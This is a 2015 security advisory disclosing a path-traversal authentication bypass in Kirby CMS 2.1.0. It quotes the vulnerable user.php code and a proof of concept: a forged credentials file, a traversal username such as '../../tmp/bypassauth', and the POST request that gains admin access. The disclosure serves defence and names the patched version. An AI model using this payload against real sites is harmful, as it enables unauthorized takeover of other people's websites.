@@ -1,0 +1,203 @@
+=============================================
+- Release date: 14.09.2015
+- Discovered by: Dawid Golunski
+- Severity: Medium/High
+=============================================
+
+ 
+I. VULNERABILITY
+-------------------------
+
+Kirby CMS <= 2.1.0     Authentication Bypass via Path Traversal
+
+ 
+II. BACKGROUND
+-------------------------
+
+- Kirby CMS
+
+"Kirby is a file‑based CMS
+Easy to setup. Easy to use. Flexible as hell."
+
+http://getkirby.com/
+
+ 
+III. INTRODUCTION
+-------------------------
+
+KirbyCMS has a vulnerability that allows to bypass authentication in a hosting
+environment where users within the same shared environment can save/read files
+in a directory accessible by both the victim and the attacker.
+
+
+IV. DESCRIPTION
+-------------------------
+ 
+As KirbyCMS is a file based CMS, it also stores authentication data
+within files in accounts directory, each user has its own password file such as:
+kirby/site/accounts/[username].php
+At login, KirbyCMS refer to the password file to verify the passwor hash. 
+During the process, it fails to validate the resulting path to ensure that
+it does not contain path traversal sequences such as '../' within the login
+variable provided by a user. 
+
+This makes it vulnerable to a path traversal attack and allows to bypass 
+the authentication if an attacker is located in the same multi-user hosting 
+environment and can write files to a public directory such as /tmp accessible 
+by the victim site with KirbyCMS.
+
+The exact code responsible for this vulnerability is located in 
+kirby/core/user.php file and is shown below:
+
+---[ kirby/core/user.php ]---
+
+abstract class UserAbstract {
+
+  protected $username = null;
+  protected $cache = array();
+  protected $data = null;
+
+  public function __construct($username) {
+
+    $this->username = str::lower($username);
+
+    // check if the account file exists
+    if(!file_exists($this->file())) {
+      throw new Exception('The user account could not be found');
+    }
+        ...
+  }
+
+  protected function file() {
+    return kirby::instance()->roots()->accounts() . DS . $this->username() . '.php';
+  }
+
+-----------------------------
+
+
+In addition to the authentication bypass KirbyCMS was found to allow
+authentication over HTTP protocol (resulting in passwords being sent 
+unencrypted), and to never expire authenticated sessions.
+ 
+V. PROOF OF CONCEPT
+-------------------------
+
+KirbyCMS stores credentials in: kirby/site/accounts directory as PHP files
+to prevent the contents from being accessed directly via the web server. 
+
+An example file with credentials looks as follows:
+
+---[ victimuser.php ]---
+
+<?php if(!defined('KIRBY')) exit ?>
+
+username: victim
+email: victim@mailserver.com
+password: >
+  $2a$10$B3DQ5e40XQOSUDSrA4AnxeolXJNDBb5KBNfkOCKlAjznvDU7IuqpC
+language: en
+role: admin
+
+------------------------
+
+To bypass the authentication an attacker who has an account in the same
+hosting environment as the victim can write the above credentials file 
+containing an encrypted hash of the password: trythisout
+into a public directory such as:
+
+/tmp/bypassauth.php
+
+Because of the aformentioned Path Traversal vulnerability the attacker
+can use such credentials and log in as an administrator 
+(via: http://victim-server.com/kirby/panel/login) with:
+
+Username: ../../../../../../../../tmp/bypassauth
+Password: trythisout
+
+which will produce a HTTP POST request similar to:
+
+POST /kirby/panel/login HTTP/1.1
+Host: victim_kirby_site
+Cookie: PHPSESSID=mqhncr49bpbgnt9kqrp055v7r6; kirby=58eddb6...
+Content-Length: 149
+
+username=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fbypassauth&password=trythisout&_csfr=erQ1UvOm2L1...
+
+
+This will cause KirbyCMS to load credentials from the path: 
+/sites/victim/kirby/site/accounts/../../../../../../../../tmp/bypassauth.php 
+
+As a result, the attacker will get the following response:
+
+<h2 class="hgroup hgroup-single-line cf">
+<span class="hgroup-title">
+  <a href="#/users/edit/../../../../../../../../tmp/bypassauth">Your account</a>
+</span>
+<span class="hgroup-options shiv shiv-dark shiv-left">
+
+getting access to the KirbyCMS control panel with admin rights.
+
+
+VI. BUSINESS IMPACT
+-------------------------
+
+Users who make use of vulnerable versions of KirbyCMS in shared hosting
+environments are at risk of having their website modified by unauthorized users.
+An attacker who manages to log in as an administrator will be able to change
+all the existing content as well as upload new files. 
+This attack could be combined with the: 'CSRF Content Upload and PHP Script 
+Execution' vulnerability, also discovered by Dawid Golunski and described in a 
+separate document.
+ 
+VII. SYSTEMS AFFECTED
+-------------------------
+
+The latest version of KirbyCMS (2.1.0) was confirmed to be exploitable.
+
+To exploit the vulnerability an attacker must be able to write a malicious
+credentials file on the system in a public directory that is accessible by the
+victim KirbyCMS site. This is a common situation on many hosting environments
+that allow to write/read files from temporary directories such as /tmp, 
+/var/tmp etc. 
+Such file could potentially also be uploaded by other means, even if
+the attacker does not have an account on the same server, such as anonymous FTP
+, an email attachment which gets saved in a tmp file on the server etc.
+
+ 
+VIII. SOLUTION
+-------------------------
+
+Upgrade to the patched version 2.1.1 released by the vendor upon this advisory.
+ 
+IX. REFERENCES
+-------------------------
+
+http://legalhackers.com
+
+http://legalhackers.com/advisories/KirbyCMS-Path-Traversal-Authentication-Bypass-Vulnerability.txt
+
+http://getkirby.com/
+
+http://seclists.org/fulldisclosure/2015/Sep/index.html
+http://www.securiteam.com/
+
+
+X. CREDITS
+-------------------------
+
+The vulnerability has been discovered by Dawid Golunski
+dawid (at) legalhackers (dot) com
+legalhackers.com
+ 
+XI. REVISION HISTORY
+-------------------------
+
+14.09.2015 - Final
+ 
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
+
